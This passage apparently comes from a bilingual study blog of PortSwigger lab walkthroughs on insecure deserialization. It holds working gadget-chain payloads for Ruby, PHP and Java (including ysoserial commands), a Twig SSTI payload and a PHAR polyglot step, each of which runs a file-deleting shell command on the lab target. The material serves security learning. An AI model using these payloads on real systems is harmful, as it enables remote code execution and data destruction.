<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span></span></code></pre>
<ol type="1">
<li>copy</li>
</ol></li>
<li><p>Replace Cookie with Clipboard Content in request，send
request</p></li>
</ol>
<h4
id="lab-exploiting-ruby-deserialization-using-a-documented-gadget-chain">Lab:
Exploiting Ruby deserialization using a documented gadget chain</h4>
<ol type="1">
<li><p>Browse the web to find the
<code>Universal Deserialisation Gadget for Ruby 2.x-3.x</code> by
<code>vakzz</code> on <code>devcraft.io</code></p></li>
<li><p>script</p>
<pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">=begin

Welcome to GDB Online.
GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl,
C#, OCaml, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog.
Code, Compile, Run and Debug online from anywhere in world.

=end</span>
<span class="token comment"># Autoload the required classes</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'base64'</span></span>
Gem<span class="token double-colon punctuation">::</span>SpecFetcher
Gem<span class="token double-colon punctuation">::</span>Installer

<span class="token comment"># prevent the payload from running when we Marshal.dump it</span>
<span class="token keyword">module</span> <span class="token class-name">Gem</span>
  <span class="token keyword">class</span> <span class="token class-name">Requirement</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">marshal_dump</span></span>
      <span class="token punctuation">[</span><span class="token variable">@requirements</span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

wa1 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>Kernel<span class="token punctuation">,</span> <span class="token symbol">:system</span><span class="token punctuation">)</span>

rs <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocate
rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@sets'</span></span><span class="token punctuation">,</span> wa1<span class="token punctuation">)</span>
rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@git_set'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"rm /home/carlos/morale.txt"</span></span><span class="token punctuation">)</span>

wa2 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span> <span class="token symbol">:resolve</span><span class="token punctuation">)</span>

i <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token double-colon punctuation">::</span>Entry<span class="token punctuation">.</span>allocate
i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@read'</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@header'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"aaa"</span></span><span class="token punctuation">)</span>


n <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span>BufferedIO<span class="token punctuation">.</span>allocate
n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@debug_output'</span></span><span class="token punctuation">,</span> wa2<span class="token punctuation">)</span>

t <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token punctuation">.</span>allocate
t<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>

r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Requirement<span class="token punctuation">.</span>allocate
r<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@requirements'</span></span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>

payload <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcher<span class="token punctuation">,</span> Gem<span class="token double-colon punctuation">::</span>Installer<span class="token punctuation">,</span> r<span class="token punctuation">]</span><span class="token punctuation">)</span>
puts Base64<span class="token punctuation">.</span>encode64<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre></li>
<li><p>copt the output<img
src="https://s2.loli.net/2023/08/18/5tSv3Dk6eaAOcxj.png"
alt="image-20230818120826614" /></p></li>
<li><p>去掉换行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"your text"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n\r'</span></code></pre></li>
<li><p>copy the output,url encode it,replace the original cookie<img
src="https://s2.loli.net/2023/08/18/MzQTICGmujPkAt9.png"
alt="image-20230818121042597" /></p></li>
</ol>
<h4
id="lab-developing-a-custom-gadget-chain-for-java-deserialization">Lab:
Developing a custom gadget chain for Java deserialization</h4>
<ol type="1">
<li><p>find source code:<img
src="https://s2.loli.net/2023/08/18/ZkXRhAdy5SOs3Jt.png"
alt="image-20230818155716059" /></p>
<ol type="1">
<li><p>ProductTemplate.java: Notice that the
<code>ProductTemplate.readObject()</code> method passes the template's
<code>id</code> attribute into a SQL statement.</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">data<span class="token punctuation">.</span>productcatalog</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">common<span class="token punctuation">.</span>db<span class="token punctuation">.</span></span><span class="token class-name">JdbcConnectionBuilder</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductTemplate</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> id<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token class-name">Product</span> product<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>
    <span class="token punctuation">&#123;</span>
        inputStream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">JdbcConnectionBuilder</span> connectionBuilder <span class="token operator">=</span> <span class="token class-name">JdbcConnectionBuilder</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>
                <span class="token string">"org.postgresql.Driver"</span><span class="token punctuation">,</span>
                <span class="token string">"postgresql"</span><span class="token punctuation">,</span>
                <span class="token string">"localhost"</span><span class="token punctuation">,</span>
                <span class="token number">5432</span><span class="token punctuation">,</span>
                <span class="token string">"postgres"</span><span class="token punctuation">,</span>
                <span class="token string">"postgres"</span><span class="token punctuation">,</span>
                <span class="token string">"password"</span>
        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withAutoCommit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">&#123;</span>
            <span class="token class-name">Connection</span> connect <span class="token operator">=</span> connectionBuilder<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE id = '%s' LIMIT 1"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Statement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            product <span class="token operator">=</span> <span class="token class-name">Product</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Product</span> <span class="token function">getProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> product<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre></li>
</ol></li>
<li><p>based on the leaked source code, write a small Java program that
instantiates a <code>ProductTemplate</code> with an arbitrary ID,
serializes it, and then Base64-encodes it.</p>
<ol type="1">
<li><p><a
target="_blank" rel="noopener" href="https://github.com/PortSwigger/serialization-examples/tree/master/java/solution">example</a></p></li>
<li><p>all you need to change is the <code>"your-payload-here"</code>
string in the <code>Main.java</code> file. <img
src="https://s2.loli.net/2023/08/18/mYbikey3Tutr1Gh.png"
alt="image-20230818161052795" /><img
src="https://s2.loli.net/2023/08/18/fqLpegnxI3VsaEN.png"
alt="image-20230818161119030" /><img
src="https://s2.loli.net/2023/08/18/vrKNObLRjIMTlxY.png"
alt="image-20230818161346836" /></p></li>
<li><p>try to set <code>id</code> to a single apostrophe<img
src="https://s2.loli.net/2023/08/18/rICjaJZukS7VP3s.png"
alt="image-20230818160432780" /></p></li>
<li><p>noticed sql injection<img
src="https://s2.loli.net/2023/08/18/p42WrkODiJMs7vb.png"
alt="image-20230818160535200" /></p></li>
</ol></li>
<li><p>Enumerate databases, tables, and columns,the final result is
obtaining the <strong>administrator password.</strong></p></li>
</ol>
<h4
id="lab-developing-a-custom-gadget-chain-for-php-deserialization">Lab:
Developing a custom gadget chain for PHP deserialization</h4>
<ol type="1">
<li><p>request source code<img
src="https://s2.loli.net/2023/08/18/WiUzyeJHFC6VajD.png"
alt="image-20230818171456831" /></p></li>
<li><p>analysis: craft inject object</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CustomTemplate</span><span class="token operator">-></span>default_desc_type <span class="token operator">=</span> <span class="token string">"rm /home/carlos/morale.txt"</span><span class="token punctuation">;</span>
<span class="token class-name">CustomTemplate</span><span class="token operator">-></span>desc <span class="token operator">=</span> <span class="token class-name">DefaultMap</span><span class="token punctuation">;</span>
<span class="token class-name">DefaultMap</span><span class="token operator">-></span>callback <span class="token operator">=</span> <span class="token string">"exec"</span></code></pre>
<p>this causes the <code>Product</code> constructor to try and fetch the
<code>default_desc_type</code> from the <code>DefaultMap</code> object.
As it doesn't have this attribute, <code>$name</code> will store
<code>default_desc_type</code> = "rm /home/carlos/morale.txt" ,the
<code>__get()</code> method will invoke the callback <code>exec()</code>
method on the default_desc_type, which is set to our shell
command.</p></li>
<li><p>exploit: base64 encode &amp; url encode it</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">O</span><span class="token punctuation">:</span><span class="token header-value">14:"CustomTemplate":2:&#123;s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:&#123;s:8:"callback";s:4:"exec";&#125;&#125;</span></span></code></pre></li>
</ol>
<h4 id="phar-deserialization">PHAR deserialization</h4>
<ol type="1">
<li>there is <strong>no obvious</strong> use of the
<code>unserialize()</code> method.</li>
</ol>
<h4
id="lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain">Lab:
Using PHAR deserialization to deploy a custom gadget chain</h4>
<ol type="1">
<li><p>A significant portion of PHP's file system functions, when
parsing PHAR files through the <code>phar://</code> pseudo protocol,
will deserialize the meta-data.</p></li>
<li><p>Upload a valid JPG as your avatar. Notice that it is loaded using
<code>GET /cgi-bin/avatar.php?avatar=wiener</code></p></li>
<li><p>request <code>GET /cgi-bin</code>,get source code<img
src="https://s2.loli.net/2023/08/18/2onlJu37Xze5P9b.png"
alt="image-20230818190500280" /><img
src="https://s2.loli.net/2023/08/18/B9cLk1UN6w5vGXd.png"
alt="image-20230818190521158" /></p></li>
<li><p>Notice that the website uses the Twig template engine. You can
use deserialization to pass in an server-side template injection (SSTI)
payload. Find a documented SSTI payload for remote code execution on
Twig, and adapt it to delete Carlos's file:</p>
<pre class="language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>registerUndefinedFilterCallback<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>getFilter<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>rm /home/carlos/morale.txt<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span></code></pre></li>
<li><p>Write a some PHP for creating a <code>CustomTemplate</code> and
<code>Blog</code> containing your SSTI payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomTemplate</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blog</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("rm /home/carlos/morale.txt")&#125;&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
<span class="token variable">$object</span><span class="token operator">-></span><span class="token property">template_file_path</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span></code></pre></li>
<li><p>Create a <code>PHAR-JPG</code> polyglot containing your PHP
script.</p></li>
<li><p>upload avatar</p></li>
<li><p>request:
<code>GET /cgi-bin/avatar.php?avatar=phar://wiener</code><img
src="https://s2.loli.net/2023/08/18/IP1Adun2mEcgzoY.png"
alt="image-20230818190937840" /></p></li>
</ol>
<h3 id="insecure-deserialization2023-06-24">Insecure
deserialization（2023-06-24）</h3>
<ul>
<li><p><strong>序列化</strong>是将复杂的数据结构，如对象及其字段，转换为可以作为连续字节流发送和接收的“扁平”格式的过程。序列化数据使得以下操作更加简单：</p>
<p>将复杂数据写入进程间内存、文件或数据库
发送复杂数据，例如通过网络，在应用程序的不同组件之间传递数据，或在API调用中传递数据
重要的是，在序列化对象时，对象的状态也被持久化。换句话说，对象的属性以及其分配的值都被保留下来。</p></li>
<li><p><strong>反序列化</strong>是将字节流恢复为与原始对象完全相同状态的完全功能副本的过程。网站的逻辑可以与这个反序列化的对象进行交互，就像与任何其他对象一样。许多编程语言都提供对序列化的原生支持。对象的序列化方式<strong>取决于</strong>具体的编程语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，可读性也不同。需要注意的是，原始对象的所有属性都存储在序列化的数据流中，包括任何私有字段。要防止字段被序列化，必须在类声明中显式标记为“transient”。</p>
<p>请注意，在使用不同的编程语言时，序列化可能被称为<code>marshalling（Ruby）或pickling（Python）</code>。这些术语在这个上下文中与“序列化”是同义词。</p></li>
<li><p><strong>不安全的反序列化</strong>是指网站对<strong>用户可控数据</strong>进行反序列化的情况。这可能使攻击者能够<strong>操纵序列化对象</strong>，将有害数据传递到应用程序代码中。</p>
<p>甚至可以用完全<strong>不同的类</strong>替换序列化对象。令人担忧的是，无论期望的是哪个类，任何可供网站使用的类的对象都将被反序列化和实例化。因此，不安全的反序列化有时也被称为“对象注入”漏洞。</p>
<p>意外的类的对象可能会引发异常。然而，此时可能已经造成了损害。许多基于反序列化的攻击在<strong>反序列化完成之前</strong>就已经完成。这意味着即使网站的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，基于<strong>强类型语言</strong>的逻辑的网站也可能容易受到这些技术的攻击。</p></li>
<li><p>讨论话题</p>
<ul>
<li>How to identify insecure deserialization LABS</li>
<li>Modifying serialized objects that are expected by the website
LABS</li>
<li>Passing malicious data into dangerous website functionality
LABS</li>
<li>Injecting arbitrary object types LABS</li>
<li>Chaining method invocations to control the flow of data into
dangerous sink gadgets LABS</li>
<li>Manually creating your own advanced exploits LABS</li>
<li>PHAR deserialization LABS</li>
</ul></li>
</ul>
<h4 id="exploiting-insecure-deserialization-vulnerabilities">Exploiting
insecure deserialization vulnerabilities</h4>
<ul>
<li>PHP serialization are <code>serialize()</code> and
<code>unserialize()</code></li>
<li>Java等一些语言使用<strong>二进制序列化格式</strong>
<ul>
<li>Java序列化的对象总是以<strong>相同的字节</strong>开头，这些字节在十六进制中被编码为<code>ac ed</code>，而在Base64中则被编码为<code>rO0</code></li>
<li>Any class that implements the interface
<code>java.io.Serializable</code> can be serialized and deserialized. If
you have source code access, take note of any code that uses the
<code>readObject()</code> method, which is used to read and deserialize
data from an <code>InputStream</code>.</li>
<li>write a short script in the corresponding language to create and
serialize the new object yourself.</li>
</ul></li>
</ul>
<h5 id="lab-modifying-serialized-objects-1">Lab: Modifying serialized
objects</h5>
<ul>
<li>value</li>
</ul>
<ol type="1">
<li><p>发现issue<img
src="https://s2.loli.net/2023/07/04/muENrzW9qLADTaP.png"
alt="image-20230704035501907" /></p></li>
<li><p>将对象中 <code>admin</code>后面的 <code>b:0</code>改为
<code>b:1</code>--&gt; apply changes。<strong>inspector功能</strong><img
src="https://s2.loli.net/2023/07/04/Gn7gqtHZhD1Ya8z.png"
alt="image-20230704035715674" /></p></li>
<li><p>复制修改后的cookie到网站粘贴<img
src="https://s2.loli.net/2023/07/04/MHfjY12SQy63Kwm.png"
alt="image-20230704035925695" /></p></li>
</ol>
<ul>
<li><p>php弱比较：<code>5 == "5 of something"</code>is in practice
treated as <code>5 == 5</code>.</p>
<p>This becomes even stranger when comparing a string the integer
<code>0</code>:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token number">0</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Example string"</span> <span class="token comment">// true</span></code></pre></li>
</ul>
<h5 id="lab-modifying-serialized-data-types-1">Lab: Modifying serialized
data types</h5>
<ul>
<li>几乎同上</li>
<li>关键在于
<ol type="1">
<li>username 长度</li>
<li>access_token<strong>值</strong>的数据类型改为整型<img
src="https://s2.loli.net/2023/07/04/5DupxWhoAqVZrXS.png"
alt="image-20230704070053997" /></li>
</ol></li>
</ul>
<h5
id="lab-using-application-functionality-to-exploit-insecure-deserialization-1">Lab:
Using application functionality to exploit insecure deserialization</h5>
<ol type="1">
<li>在删除账户功能的请求中发现在cookie中，对象存在一个属性指向一个路径文件，将其修改为victim目录下的文件。<img
src="https://s2.loli.net/2023/07/04/y8eBI6jiC3Pmw4H.png"
alt="image-20230704085144103" /></li>
</ol>
<h5 id="lab-arbitrary-object-injection-in-php-1">Lab: Arbitrary object
injection in PHP</h5>
<ol type="1">
<li><p>发现引用了一个模板文件 <code>CustomTemplate.php</code><img
src="https://s2.loli.net/2023/07/04/GAJcP74hkN5uOwV.png"
alt="image-20230704180228981" /></p></li>
<li><p>加上波浪线 <code>~</code> 查看这个文件<img
src="https://s2.loli.net/2023/07/04/KkE9x27Qd3MmGfH.png"
alt="image-20230704180330863" /></p>
<p>注意到 <code>__destruct</code>
方法，发现存在<strong>反序列漏洞</strong></p></li>
<li><p>构造对象，触发unlink函数<img
src="https://s2.loli.net/2023/07/04/TFiz47vqkODcXyN.png"
alt="image-20230704180519982" /></p></li>
</ol>
<h5 id="exploiting-java-deserialization-with-apache-commons">Exploiting
Java deserialization with Apache Commons</h5>
<ul>
<li><p><strong>前置</strong></p>
<p><code>Gadget chain（组件链）</code>是指由多个漏洞利用组件（gadget）链接在一起的序列化对象，用于在不安全的反序列化漏洞中执行恶意操作。漏洞利用组件是指应用程序中存在的可以<strong>协同工作以达到特定目标的代码片段</strong>。</p>
<p>在不安全的反序列化漏洞中，攻击者可以通过构建特定的gadget
chain来实现攻击目的。这些组件链通常由序列化对象的序列化表示和触发特定操作的方法调用序列组成。攻击者利用应用程序在反序列化过程中自动调用这些方法的特性，通过传递特制的序列化数据来触发恶意操作。</p>
<p>一个gadget chain的成功利用通常需要满足以下<strong>条件</strong>：</p>
<ol type="1">
<li>应用程序必须存在反序列化漏洞，允许攻击者传递自定义的序列化数据。</li>
<li>应用程序中必须存在可被利用的代码片段，即漏洞利用组件。</li>
<li>漏洞利用组件必须能够通过序列化对象的方法调用序列实现攻击目标，例如执行远程命令、获取敏感数据等。</li>
</ol>
<p>常见的gadget
chain包括在Java中使用的<code>Apache Commons Collections库</code>、<code>Java Native Serialization</code>库，以及在其他语言中使用的类似的库。这些库中的特定类和方法调用序列可以被组合成漏洞利用组件链，用于实现各种攻击。</p>
<p>值得注意的是，gadget
chain<strong>不是</strong>由攻击者构造的一系列方法调用，而是已经存在于应用程序中的代码。攻击者所控制的只是传递给gadget
chain的<strong>数据</strong>。因此，了解和构建gadget
chain是成功利用不安全的反序列化漏洞的关键要素之一。攻击者需要研究目标应用程序中的可用类和方法，找到适合的gadget
chain来达到自己的攻击目的。</p></li>
<li><p>在使用ysoserial工具时，并非所有的gadget
chain都能用于运行任意代码。相反，它们可能用于其他目的。例如，以下几个gadget
chain可以帮助您快速检测几乎任何服务器上的不安全反序列化：</p>
<ol type="1">
<li><code>URLDNS</code>链触发对提供的URL的DNS查询。最重要的是，它不依赖于目标应用程序使用特定的易受攻击的库，并且适用于任何已知的Java版本。这使得它成为用于检测目的的最通用的gadget
chain。如果您在流量中发现了一个序列化对象，您可以尝试使用这个gadget
chain生成一个对象，触发与Burp
Collaborator服务器的DNS交互。如果成功触发了DNS交互，您可以确定在目标上进行了反序列化。</li>
<li><code>JRMPClient</code>是另一个用于初步检测的通用gadget
chain。它会导致服务器尝试与提供的IP地址建立TCP连接。请注意，您需要提供一个原始的IP地址而不是主机名。在所有出站流量（包括DNS查询）都被防火墙阻止的环境中，这个gadget
chain可能很有用。您可以尝试生成两个不同IP地址的负载：一个是本地IP地址，一个是被防火墙阻止的外部IP地址。如果应用程序对带有本地地址的负载立即响应，但对带有外部地址的负载出现延迟，导致响应的时间差异，那就表明gadget
chain生效了，因为服务器尝试连接到了被防火墙阻止的地址。在这种情况下，响应的微小时间差异可以帮助您检测服务器是否发生反序列化，即使在盲目情况下也能够做到这一点。</li>
</ol></li>
</ul>
<ol type="1">
<li><p><a
target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">java反序列化工具ysoserial</a></p></li>
<li><p>jdk17 报错,切换成更低版本，因为版本17安全性更高</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">┌──(jf710001011㉿Jf7Windows)-[~&#x2F;MyFiles]
└─$ java -jar ysoserial-all.jar CommonsCollections4 &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x20d58ebb) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x20d58ebb
        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
        at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32)
        at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)</code></pre></li>
<li><p>登录账号，burp发现反序列化漏洞，使用<code>ysoserial</code></p>
<p>其中一个用于 Java 反序列化的工具是
"ysoserial"。它允许您选择一个您认为目标应用程序正在使用的库中提供的
gadget chain，然后传入一个您想要执行的命令。它会根据所选的 chain
创建相应的序列化对象。虽然这仍然需要一定的试错，但比手动构建自己的
gadget chains 要节省大量的时间和精力</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1</span>
<span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar CommonsCollections4 <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> cookieToUse.txt

<span class="token comment">#2</span>
<span class="token function">cat</span> cookieToUse.txt

这条命令使用了ysoserial-all.jar工具来生成一个基于CommonsCollections4库的攻击载荷，并将其输出进行了Base64编码后保存到文件cookieToUse.txt中。
<span class="token number">1</span>. <span class="token variable"><span class="token variable">`</span><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是使用Java运行ysoserial-all.jar工具的命令。ysoserial-all.jar是一个包含了多个攻击载荷的工具，可以一次性生成多种类型的攻击载荷。

